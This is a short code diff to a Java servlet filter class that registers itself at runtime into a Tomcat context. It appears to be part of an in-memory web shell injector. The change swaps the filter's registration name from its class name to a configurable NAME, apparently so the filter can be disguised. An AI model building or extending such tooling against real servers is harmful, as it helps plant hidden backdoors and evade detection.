@@ -28,6 +28,8 @@ public class TFMSFromRequest implements Filter {
 
 	public static String pattern;
 
+	public static String NAME;
+
 	public static String HEADER_KEY;
 
 	public static String HEADER_VALUE;
@@ -112,7 +114,7 @@ public class TFMSFromRequest implements Filter {
 	public static void addFilter() {
 		ServletContext servletContext = request.getServletContext();
 		Filter         filter         = new TFMSFromRequest();
-		String         filterName     = filter.getClass().getName();
+		String         filterName     = NAME;
 		String         url            = pattern;
 		if (servletContext.getFilterRegistration(filterName) == null) {
 			StandardContext            standardContext    = null;
